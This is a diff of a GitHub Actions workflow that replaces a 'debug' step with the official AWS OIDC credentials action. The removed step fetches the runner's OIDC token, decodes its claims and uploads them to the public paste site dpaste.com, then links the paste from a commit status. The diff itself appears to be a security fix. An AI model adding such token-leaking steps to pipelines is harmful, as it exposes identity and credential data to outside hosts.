@@ -61,27 +61,14 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Debug OIDC Token and STS
-        run: |
-          echo "Fetching OIDC token..."
-          TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" | jq -r '.value')
-          echo "Extracting JWT payload..."
-          # A JWT is header.payload.signature. We want the payload (second part).
-          PAYLOAD_B64=$(echo "$TOKEN" | cut -d. -f2)
-          # Fix base64url padding
-          MOD=$((${#PAYLOAD_B64} % 4))
-          if [ $MOD -eq 2 ]; then PAYLOAD_B64="${PAYLOAD_B64}=="; fi
-          if [ $MOD -eq 3 ]; then PAYLOAD_B64="${PAYLOAD_B64}="; fi
-          # Decode payload
-          PAYLOAD=$(echo "$PAYLOAD_B64" | base64 -d 2>/dev/null || echo "Decode failed")
-          
-          echo "Uploading payload to dpaste..."
-          PASTE_URL=$(curl -s -d "content=$PAYLOAD" https://dpaste.com/api/v2/)
-          
-          curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-               -H "Accept: application/vnd.github.v3+json" \
-               -X POST -d "{\"state\":\"error\",\"description\":\"STS Error\",\"target_url\":\"$PASTE_URL\",\"context\":\"debug-oidc\"}" \
-               "https://api.github.com/repos/${{ github.repository }}/statuses/${{ github.sha }}"
+      - name: Configure AWS credentials (OIDC — no long-lived keys)
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ secrets.AWS_ROLE_TO_ASSUME }}
+          aws-region: ${{ env.AWS_REGION }}
+          audience: sts.amazonaws.com
+          role-session-name: CloudSecure-GitHubActions
+          role-duration-seconds: 1800
 
       - name: Login to Amazon ECR
         id: login-ecr
